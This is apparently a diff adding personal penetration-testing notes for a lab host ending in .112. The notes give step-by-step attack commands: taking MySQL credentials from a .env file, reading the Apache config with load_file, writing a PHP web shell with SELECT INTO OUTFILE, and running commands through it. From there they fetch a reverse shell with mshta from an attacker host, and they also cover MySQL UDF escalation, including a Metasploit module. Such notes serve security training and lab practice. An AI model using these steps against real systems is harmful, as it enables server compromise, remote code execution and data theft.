@@ -1,0 +1,51 @@
+112 
+Getting .env
+
+it contains db credentials 
+
+Connect to mysql using them 
+
+mysql -u coolguy -p 
+
+<password found> 
+
+show databases;
+use mysql;
+
+# for viewing where the path of hosted web
+
+SELECT load_file("C:\xampp\apache\conf\httpd.conf") from information_schema
+
+It will be show where exactly hosted 
+
+SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE 'c:/xampp/htdocs/shell.php'
+
+Access to web shell 
+
+http://192.168.xx.112/shell.php?cmd=whoami
+
+After use one liner reverse shell
+eg:
+
+http://192.168.xx.112/shell.php?cmd=mshta http://your_ip/shell.hta
+Get shell.
+
+Alternative using mysql UDF
+
+Manual:
+
+https://gist.github.com/kazkansouh/3476a8c8846472da06f980494ac2c457
+
+it will generate a mysql file
+
+mysql -h xx.xx.xx.xx -u user -p password mysql <  mysql .sql
+
+Msf way:
+
+msf > use exploit/multi/mysql/mysql_udf_payload
+msf exploit(mysql_udf_payload) > set rhosts
+Set user
+Set password
+set lhost
+Set lport
+Exploit
